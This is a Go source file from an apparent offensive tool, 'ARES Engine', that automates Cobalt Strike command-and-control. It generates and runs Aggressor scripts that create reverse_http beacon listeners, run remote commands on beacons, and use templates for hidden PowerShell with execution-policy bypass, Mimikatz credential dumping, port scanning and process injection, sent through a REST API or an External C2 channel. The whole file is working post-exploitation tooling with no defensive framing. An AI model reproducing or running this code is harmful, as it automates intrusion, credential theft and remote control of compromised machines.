package cobaltstrike

import (
	"encoding/json"
	"fmt"
	"os"
	"os/exec"
	"strings"

	"github.com/ares/engine/internal/logger"
	"github.com/ares/engine/internal/uuid"
)

func GenerateAggressorScript(commands []string) (string, error) {
	script := `# Auto-generated aggressor script by ARES Engine
sub auto_script {
`

	for _, cmd := range commands {
		script += fmt.Sprintf("\t%s\n", cmd)
	}

	script += `}
# Entry point
on ready {
	auto_script();
}
`
	outputPath := fmt.Sprintf("ares_aggressor_%s.cna", uuid.New()[:8])
	if err := os.WriteFile(outputPath, []byte(script), 0644); err != nil {
		return "", fmt.Errorf("write aggressor script: %w", err)
	}

	result := fmt.Sprintf("[+] Aggressor script generated: %s (%d commands)", outputPath, len(commands))
	logger.Info("[CobaltStrike] " + result)
	return result, nil
}

func (e *CobaltStrikeEngine) ExecuteAggressorScriptFile(scriptPath string) (string, error) {
	if !e.restAPIEnabled {
		return e.executeAggressorViaExternalC2(scriptPath)
	}

	endpoint := "/api/cs/aggressor/execute"
	payload := map[string]string{"script": scriptPath}
	body, _ := json.Marshal(payload)
	result, err := e.restAPICall("POST", endpoint, strings.NewReader(string(body)))
	if err != nil {
		return "", fmt.Errorf("execute aggressor via api: %w", err)
	}
	return result, nil
}

func (e *CobaltStrikeEngine) executeAggressorViaExternalC2(scriptPath string) (string, error) {
	data, err := os.ReadFile(scriptPath)
	if err != nil {
		return "", fmt.Errorf("read script: %w", err)
	}

	frame := BuildExternalC2Frame(FrameCommand, data)
	resp, err := e.ExternalC2Send(frame)
	if err != nil {
		return "", fmt.Errorf("execute via externalc2: %w", err)
	}

	return fmt.Sprintf("[+] Aggressor script executed: %s\nResponse: %s", scriptPath, string(resp)), nil
}

func (e *CobaltStrikeEngine) AggressorAlias(name, description, tooltip, command string) (string, error) {
	script := fmt.Sprintf(`sub %s_alias {
	alias("%s", {
		$description = "%s";
		$tooltip = "%s";
		$command = "%s";
		bdesc($1, $description);
		btip($1, $tooltip);
		beacon_execute_job($1, $command, $tooltip);
	});
}
on ready {
	%s_alias();
}
`, name, name, description, tooltip, command, name)

	outputPath := fmt.Sprintf("alias_%s.cna", name)
	if err := os.WriteFile(outputPath, []byte(script), 0644); err != nil {
		return "", fmt.Errorf("write alias script: %w", err)
	}

	result, err := e.ExecuteAggressorScriptFile(outputPath)
	if err != nil {
		return "", fmt.Errorf("execute alias: %w", err)
	}

	return fmt.Sprintf("[+] Aggressor alias '%s' defined and executed\n%s", name, result), nil
}

func (e *CobaltStrikeEngine) AggressorListener(name, payload, port, host string) (string, error) {
	script := fmt.Sprintf(`sub %s_listener {
	$listener_name = "%s";
	$payload = "%s";
	$port = %s;
	$host = "%s";
	$description = "ARES auto-generated listener: %s";
	listener_create_ext($listener_name, "windows/beacon_%s/reverse_http", $payload, $host, $port, $description);
}
on ready {
	%s_listener();
}
`, name, name, payload, port, host, name, payload, name)

	outputPath := fmt.Sprintf("listener_%s.cna", name)
	if err := os.WriteFile(outputPath, []byte(script), 0644); err != nil {
		return "", fmt.Errorf("write listener script: %w", err)
	}

	result, err := e.ExecuteAggressorScriptFile(outputPath)
	if err != nil {
		return "", fmt.Errorf("execute listener: %w", err)
	}

	return fmt.Sprintf("[+] Aggressor listener '%s' created\n%s", name, result), nil
}

func (e *CobaltStrikeEngine) GenerateAggressorBeaconRemoteExec(beaconID, command string) (string, error) {
	script := fmt.Sprintf(`sub remote_exec_%s {
	beacon_remote_exec("%s", "%s");
}
on ready {
	remote_exec_%s();
}
`, beaconID, beaconID, command, beaconID)

	outputPath := fmt.Sprintf("remote_exec_%s.cna", beaconID[:8])
	if err := os.WriteFile(outputPath, []byte(script), 0644); err != nil {
		return "", fmt.Errorf("write remote exec script: %w", err)
	}

	return e.ExecuteAggressorScriptFile(outputPath)
}

func (e *CobaltStrikeEngine) GenerateAggressorScriptFromTemplate(templateName string, params map[string]string) (string, error) {
	templates := map[string]string{
		"portscan": `sub portscan_%s {
	beacon_portscan($1, "%s", "%s", "%s");
}`,
		"powershell": `sub ps_%s {
	beacon_execute_job($1, "powershell -NoP -NonI -W Hidden -Exec Bypass -C \"%s\"", "PowerShell");
}`,
		"mimikatz": `sub mimikatz_%s {
	beacon_execute_job($1, "mimikatz %s", "Mimikatz");
}`,
		"inject": `sub inject_%s {
	beacon_inject($1, "%s", "%s", "%s");
}`,
	}

	tmpl, ok := templates[templateName]
	if !ok {
		return "", fmt.Errorf("unknown template: %s", templateName)
	}

	uid := uuid.New()[:8]
	var args []interface{}
	args = append(args, uid)
	for _, v := range params {
		args = append(args, v)
	}
	script := fmt.Sprintf(tmpl, args...)

	fullScript := fmt.Sprintf(`%s
on ready {
	%s_%s();
}
`, script, templateName, uid)

	outputPath := fmt.Sprintf("%s_%s.cna", templateName, uid)
	if err := os.WriteFile(outputPath, []byte(fullScript), 0644); err != nil {
		return "", fmt.Errorf("write template script: %w", err)
	}

	return fmt.Sprintf("[+] Aggressor script generated from template '%s': %s", templateName, outputPath), nil
}

func (e *CobaltStrikeEngine) ExecuteAggressorCommand(aggressorCmd string) (string, error) {
	frame := BuildExternalC2Frame(FrameCommand, []byte(aggressorCmd))
	resp, err := e.ExternalC2Send(frame)
	if err != nil {
		return "", fmt.Errorf("send aggressor command: %w", err)
	}

	_, payload, err := ParseExternalC2Frame(append([]byte{0, 0, 0, 0}, resp...))
	if err != nil {
		return string(resp), nil
	}

	return string(payload), nil
}

func ExecuteAggressorScriptCLI(scriptPath string) (string, error) {
	cmd := exec.Command("cna-exec", scriptPath)
	output, err := cmd.CombinedOutput()
	if err != nil {
		return "", fmt.Errorf("cna-exec: %w\n%s", err, string(output))
	}
	return strings.TrimSpace(string(output)), nil
}
